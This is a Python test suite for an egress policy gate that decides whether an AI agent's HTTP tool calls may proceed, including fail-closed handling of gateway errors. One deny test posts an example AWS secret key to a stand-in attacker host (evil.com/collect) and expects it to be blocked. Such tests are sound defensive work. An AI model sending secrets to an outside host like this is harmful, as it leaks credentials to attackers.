"""Tier-3 egress PEP — `safe_http_request` policy-client tests.

All hermetic: the PDP and the outbound request are both `httpx.MockTransport`s,
no live gateway/network/MCP runtime required. One optional live smoke against
a running gateway is included and skips cleanly if it is unreachable.

Covers PEP responsibilities and fail-closed behaviour: PDP unreachable,
timeout, non-2xx, and malformed response all deny without executing the outbound.
"""

from __future__ import annotations

import httpx
import pytest

from agentgate.pep.safe_http_request import safe_http_request


def _pdp_client(handler) -> httpx.Client:
    return httpx.Client(transport=httpx.MockTransport(handler))


def _outbound_client(handler) -> httpx.Client:
    return httpx.Client(transport=httpx.MockTransport(handler))


def _never_called(request: httpx.Request) -> httpx.Response:
    raise AssertionError(f"outbound transport should not have been called: {request.url}")


# ---- allow -> outbound performed -------------------------------------------------

def test_allow_performs_outbound_and_returns_result():
    def pdp_handler(request: httpx.Request) -> httpx.Response:
        body = request.read()
        import json

        payload = json.loads(body)
        assert payload["tool_name"] == "safe_http_request"
        assert payload["tool_kind"] == "network"
        assert payload["arguments"]["url"] == "https://api.internal.example/data"
        assert payload["arguments"]["method"] == "POST"
        return httpx.Response(
            200,
            json={
                "decision": "allow",
                "reason": "destination allowlisted",
                "policy": "network-egress",
                "audit_id": "audit-1",
            },
        )

    outbound_called = {"count": 0}

    def outbound_handler(request: httpx.Request) -> httpx.Response:
        outbound_called["count"] += 1
        assert str(request.url) == "https://api.internal.example/data"
        return httpx.Response(201, json={"ok": True})

    result = safe_http_request(
        url="https://api.internal.example/data",
        method="POST",
        body="hello",
        pdp_client=_pdp_client(pdp_handler),
        outbound_client=_outbound_client(outbound_handler),
    )

    assert result.executed is True
    assert result.decision == "allow"
    assert result.policy == "network-egress"
    assert result.audit_id == "audit-1"
    assert outbound_called["count"] == 1
    assert result.outbound is not None
    assert result.outbound.status_code == 201


# ---- deny -> outbound NOT performed, reason surfaced ------------------------------

def test_deny_does_not_perform_outbound_and_surfaces_reason():
    def pdp_handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200,
            json={
                "decision": "deny",
                "reason": "destination not allowlisted; payload carries secret (aws_access_key)",
                "policy": "network-egress",
                "audit_id": "audit-2",
            },
        )

    result = safe_http_request(
        url="https://evil.com/collect",
        method="POST",
        body="AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE",
        pdp_client=_pdp_client(pdp_handler),
        outbound_client=_outbound_client(_never_called),
    )

    assert result.executed is False
    assert result.decision == "deny"
    assert result.reason == (
        "destination not allowlisted; payload carries secret (aws_access_key)"
    )
    assert result.policy == "network-egress"
    assert result.audit_id == "audit-2"
    assert result.outbound is None


# ---- fail-closed: PDP timeout ------------------------------------------------------

def test_pdp_timeout_fails_closed():
    def pdp_handler(request: httpx.Request) -> httpx.Response:
        raise httpx.TimeoutException("timed out", request=request)

    result = safe_http_request(
        url="https://api.internal.example/data",
        pdp_client=_pdp_client(pdp_handler),
        outbound_client=_outbound_client(_never_called),
    )

    assert result.executed is False
    assert result.decision == "deny"
    assert result.policy.startswith("fail-closed")
    assert "timed out" in result.reason.lower() or "timeout" in result.reason.lower()


# ---- fail-closed: PDP unreachable / connection refused -----------------------------

def test_pdp_connection_refused_fails_closed():
    def pdp_handler(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("connection refused", request=request)

    result = safe_http_request(
        url="https://api.internal.example/data",
        pdp_client=_pdp_client(pdp_handler),
        outbound_client=_outbound_client(_never_called),
    )

    assert result.executed is False
    assert result.decision == "deny"
    assert result.policy == "fail-closed:unreachable"
    assert "unreachable" in result.reason.lower() or "refused" in result.reason.lower()


# ---- fail-closed: PDP non-2xx -------------------------------------------------------

def test_pdp_non_2xx_fails_closed():
    def pdp_handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(500, text="internal server error")

    result = safe_http_request(
        url="https://api.internal.example/data",
        pdp_client=_pdp_client(pdp_handler),
        outbound_client=_outbound_client(_never_called),
    )

    assert result.executed is False
    assert result.decision == "deny"
    assert result.policy == "fail-closed:bad-status"
    assert "500" in result.reason


# ---- fail-closed: PDP malformed / unparseable response ------------------------------

def test_pdp_malformed_json_fails_closed():
    def pdp_handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, content=b"not json", headers={"content-type": "application/json"})

    result = safe_http_request(
        url="https://api.internal.example/data",
        pdp_client=_pdp_client(pdp_handler),
        outbound_client=_outbound_client(_never_called),
    )

    assert result.executed is False
    assert result.decision == "deny"
    assert result.policy == "fail-closed:malformed-response"


def test_pdp_missing_decision_field_fails_closed():
    def pdp_handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={"reason": "oops", "policy": "network-egress"})

    result = safe_http_request(
        url="https://api.internal.example/data",
        pdp_client=_pdp_client(pdp_handler),
        outbound_client=_outbound_client(_never_called),
    )

    assert result.executed is False
    assert result.decision == "deny"
    assert result.policy == "fail-closed:malformed-response"


# ---- bearer token forwarding --------------------------------------------------------

def test_bearer_token_forwarded_to_pdp():
    seen = {}

    def pdp_handler(request: httpx.Request) -> httpx.Response:
        seen["auth"] = request.headers.get("authorization")
        return httpx.Response(
            200, json={"decision": "deny", "reason": "denied", "policy": "network-egress"}
        )

    safe_http_request(
        url="https://api.internal.example/data",
        bearer="secret-token",
        pdp_client=_pdp_client(pdp_handler),
        outbound_client=_outbound_client(_never_called),
    )

    assert seen["auth"] == "Bearer secret-token"


# ---- optional live smoke against a running gateway -----------------------------------

def test_live_smoke_against_real_gateway():
    """Optional live smoke: hits a local gateway if it's up. Skips cleanly
    (does not fail) if the gateway is unreachable."""
    gw_base = "http://127.0.0.1:4100"
    try:
        probe = httpx.post(
            f"{gw_base}/a/egress/decision",
            json={
                "tool_name": "safe_http_request",
                "tool_kind": "network",
                "arguments": {"url": f"{gw_base}/healthz", "method": "GET"},
            },
            timeout=1.0,
        )
    except httpx.HTTPError:
        pytest.skip("local gateway not reachable")

    if probe.status_code == 404:
        pytest.skip("local gateway running without the /a/egress/decision route")
    if probe.status_code != 200:
        pytest.skip(f"local gateway /a/egress/decision unhealthy: {probe.status_code}")

    # Use the gateway's own healthz as the egress target: loopback is always
    # allowlisted, so the PDP should `allow`, and the outbound GET succeeds.
    result = safe_http_request(
        url=f"{gw_base}/healthz",
        method="GET",
    )

    assert result.decision == "allow"
    assert result.executed is True
    assert result.outbound is not None
    assert result.outbound.status_code == 200
